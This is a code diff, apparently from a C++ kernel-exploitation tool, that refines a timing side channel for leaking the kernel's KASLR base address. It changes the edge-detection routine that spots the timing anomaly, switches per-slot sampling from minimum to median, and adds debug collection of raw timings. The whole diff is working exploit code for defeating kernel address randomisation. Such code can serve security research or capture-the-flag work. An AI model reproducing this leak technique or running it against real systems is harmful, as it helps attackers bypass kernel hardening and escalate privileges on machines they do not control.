@@ -86,64 +86,11 @@ std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
     }
     uint64_t threshold = max_diff / 2;
 
-    std::cout << "median: " << median << " threshold: " << threshold << std::endl;
     for (size_t slot = 0; slot < timings.size(); slot++) {
-        printf("%lx: %lu \n", slot_to_addr(slot), timings[slot]);
-    }
-
-    // 1. Create Binary Mask
-    std::vector<int> mask(timings.size());
-    for (size_t i = 0; i < timings.size(); ++i) {
-        uint64_t diff = abs_diff(timings[i], median);
-        mask[i] = (diff >= threshold) ? 1 : 0;
-    }
-
-    // 2. Fill Gaps
-    const size_t max_gap = 1;
-    std::vector<int> filled_mask = mask;
-
-    std::vector<size_t> ones_indices;
-    for (size_t i = 0; i < mask.size(); ++i) {
-        if (mask[i] == 1) ones_indices.push_back(i);
-    }
-
-    if (!ones_indices.empty()) {
-        for (size_t i = 0; i < ones_indices.size() - 1; ++i) {
-            size_t idx1 = ones_indices[i];
-            size_t idx2 = ones_indices[i+1];
-            size_t gap_size = idx2 - idx1 - 1;
-            
-            if (gap_size > 0 && gap_size <= max_gap) {
-                for (size_t k = idx1 + 1; k < idx2; ++k) {
-                    filled_mask[k] = 1;
-                }
-            }
+        uint64_t diff = abs_diff(timings[slot], median);
+        if (diff >= threshold) {
+            return slot;
         }
-    }
-
-    // 3. Remove Short Runs
-    const size_t min_length = 2;
-    std::vector<int> final_mask = filled_mask;
-    
-    size_t current_idx = 0;
-    while (current_idx < final_mask.size()) {
-        int key = final_mask[current_idx];
-        size_t run_len = 0;
-        while (current_idx + run_len < final_mask.size() && final_mask[current_idx + run_len] == key) {
-            run_len++;
-        }
-        
-        if (key == 1 && run_len < min_length) {
-            for (size_t k = current_idx; k < current_idx + run_len; ++k) {
-                final_mask[k] = 0;
-            }
-        }
-        current_idx += run_len;
-    }
-
-    // 4. Find the Start
-    for (size_t i = 0; i < final_mask.size(); ++i) {
-        if (final_mask[i] == 1) return (uint64_t)i;
     }
 
     return std::nullopt;
@@ -200,26 +147,32 @@ uint64_t sidechannel(uint64_t addr) {
     return delta;
 }
 
-std::optional<uint64_t> try_leak_kaslr_base(int samples) {
+std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
-    std::vector<uint64_t> timings(slots, std::numeric_limits<uint64_t>::max());
+    std::vector<std::vector<uint64_t>> all_timings(slots);
+    for (auto& t : all_timings) {
+        t.reserve(samples);
+    }
 
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
-            syscall(104);
+            // syscall(104);
             uint64_t timing = sidechannel(addr);
-            if (timing < timings[slot]) {
-                timings[slot] = timing;
-            }
+            all_timings[slot].push_back(timing);
         }
+    }
+
+    std::vector<uint64_t> timings(slots);
+    for (size_t slot = 0; slot < slots; slot++) {
+        timings[slot] = compute_median(all_timings[slot]);
     }
 
     std::optional<size_t> slot = try_find_edge(timings);
     if (slot.has_value()) {
-        return slot_to_addr(*slot);
+        return {slot_to_addr(*slot), timings};
     }
-    return std::nullopt;
+    return {std::nullopt, timings};
 }
 
 std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>& slots) {
@@ -254,11 +207,15 @@ std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>
     return std::nullopt;
 }
 
-uint64_t leak_kaslr_base(int samples, int trials) {
+uint64_t leak_kaslr_base(int samples, int trials, std::vector<std::vector<uint64_t>>* debug_data) {
     std::vector<std::optional<uint64_t>> slots(trials);
     for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
         for (int trial = 0; trial < trials; trial++) {
-            slots[trial] = try_leak_kaslr_base(samples);
+            auto result = try_leak_kaslr_base(samples);
+            slots[trial] = result.first;
+            if (debug_data) {
+                 debug_data->push_back(result.second);
+            }
         }
         std::optional<uint64_t> slot = find_majority(slots);
         if (slot.has_value()) {
